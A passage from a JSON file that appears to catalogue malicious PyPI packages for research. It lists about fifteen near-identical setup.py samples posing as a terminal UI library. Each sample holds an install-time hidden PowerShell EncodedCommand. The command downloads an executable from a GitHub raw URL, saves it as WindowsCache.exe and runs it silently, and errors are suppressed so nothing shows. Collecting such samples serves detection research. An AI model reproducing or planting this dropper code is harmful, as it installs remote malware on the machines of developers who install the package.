        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpaypalnvidiaurl',\n    packages = ['modlib'],\n    version = '5.30',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-esqpepintpyw-v3.40",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpepintpyw',\n    packages = ['modlib'],\n    version = '2.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-esqpeprandpaypal-v5.38",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpeprandpaypal',\n    packages = ['modlib'],\n    version = '6.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-esqrerecandy-v2.70",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrerecandy',\n    packages = ['modlib'],\n    version = '5.52',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-esqultraultrapong-v7.37",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqultraultrapong',\n    packages = ['modlib'],\n    version = '10.64',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-libgetrandram-v7.78",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libgetrandram',\n    packages = ['modlib'],\n    version = '4.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-librereplacereplace-v8.23",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'librereplacereplace',\n    packages = ['modlib'],\n    version = '4.34',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-py-hydraurlstudy-v2.37",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-hydraurlstudy',\n    packages = ['modlib'],\n    version = '1.14',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-py-proofnvidiavm-v7.87",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-proofnvidiavm',\n    packages = ['modlib'],\n    version = '1.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-py-ultrageturl-v4.17",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-ultrageturl',\n    packages = ['modlib'],\n    version = '2.19',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-selfhackedrandomstudy-v5.55",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhackedrandomstudy',\n    packages = ['modlib'],\n    version = '9.44',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-selfpostmcintel-v10.27",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpostmcintel',\n    packages = ['modlib'],\n    version = '8.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-selfvisapostosint-v1.16",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvisapostosint',\n    packages = ['modlib'],\n    version = '2.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-tppylgtbnvidia-v3.11",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppyLGTBnvidia',\n    packages = ['modlib'],\n    version = '3.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-tppyrandomed-v4.33",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppyrandomed',\n    packages = ['modlib'],\n    version = '2.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-tptoolpywgui-v10.56",
